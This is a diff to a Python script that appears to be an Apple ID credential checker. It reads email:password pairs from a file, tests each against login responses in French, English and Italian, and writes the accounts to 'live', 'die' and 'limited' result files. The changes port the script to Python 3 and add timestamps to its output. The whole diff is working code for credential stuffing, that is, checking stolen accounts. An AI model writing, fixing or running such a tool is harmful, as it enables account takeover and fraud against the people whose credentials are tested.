@@ -28,7 +28,7 @@ def main():
  green = c.Fore.LIGHTGREEN_EX
  yellow = c.Fore.LIGHTYELLOW_EX
  genta = c.Fore.LIGHTMAGENTA_EX
- blue = c.Fore.BLUE
+ blue = c.Fore.LIGHTBLUE_EX
  yell = c.Fore.YELLOW
  init()
  giv_p = ps.system()
@@ -73,8 +73,8 @@ def main():
      print("[+] Scan at "+str(year)+"/"+str(month)+"/"+str(day)) 
  mydate()
  # hahah Mailist
- my_file = raw_input("\n>> FILE ACCOUNTS [EMAIL[SPLIT]PASSWORD] >>>> ")
- my_split = raw_input(">> YOUR EMAIL AND PASS SPLIT >>>> ")
+ my_file = input("\n>> FILE ACCOUNTS [EMAIL[SPLIT]PASSWORD] >>>> ")
+ my_split = input(">> YOUR EMAIL AND PASS SPLIT >>>> ")
  print(">> RZLT FILE...")
  time.sleep(3)
  # Create File RZT
@@ -129,27 +129,28 @@ def main():
     
     # Condition for multi lang msg
     if ("FR-FR" in language):
-     die = "Votre identifiant Apple ou votre mot de passe n’a pas été saisi correctement."
-     live = "SDL WorldServer 11.3.0.4589 - Login"
+     die = "Votre identifiant Apple ou votre mot de passe n’a pas été saisi correctement.".encode()
+     live = "SDL WorldServer 11.3.0.4589 - Login".encode()
 
     elif("EN-EN" in language):
-     die = "Your Apple ID or password was entered incorrectly."
-     live = "SDL WorldServer 11.3.0.4589 - Login"
+     die = "Your Apple ID or password was entered incorrectly.".encode()
+     live = "SDL WorldServer 11.3.0.4589 - Login".encode()
 
     elif("IT-IT"):
-     die= "L’ID Apple o la password non sono corretti."
-     live = "SDL WorldServer 11.3.0.4589 - Login"
-      
+     die= "L’ID Apple o la password non sono corretti.".encode()
+     live = "SDL WorldServer 11.3.0.4589 - Login".encode()
+    # ADD FULL TIME
+    time_full = "- " + blue + time.ctime() + " "
     #limited = "Cet identifiant Apple a été verrouillé pour des raisons de sécurité."
     if(die in connect):
         # save invalid account
-        print(red+"[-] DIE ACCOUNT >>> "+my_email+" | "+my_pass+"")
+        print(time_full+red+"[-] DIE ACCOUNT >>> "+my_email+" | "+my_pass+"")
         save_invalid = open("rzlt/die.txt","a+")
         save_invalid.write("DIE : "+my_email+" | "+my_pass+"\n")
         
     elif(live in connect):
      # save valid
-        print(green+"[+] LIVE ACCOUNT >> "+my_email+" | "+my_pass+"")
+        print(time_full+green+"[+] LIVE ACCOUNT >> "+my_email+" | "+my_pass+"")
         save_valid = open("rzlt/live.txt","a+")
         save_valid.write("LIVE : "+my_email+" | "+my_pass+"\n")
         
@@ -160,7 +161,7 @@ def main():
     #    save_lim.write("LIMITED : "+my_email+" | "+my_pass+"\n")     
         
     else:
-        print(yellow+"[!] LIMITED ACCOUNT >>> "+my_email+" | "+my_pass+"")
+        print(time_full+yellow+"[!] LIMITED ACCOUNT >>> "+my_email+" | "+my_pass+"")
         save_lim = open("rzlt/limited.txt","a+")
         save_lim.write("LIMITED : "+my_email+" | "+my_pass+"\n")
 
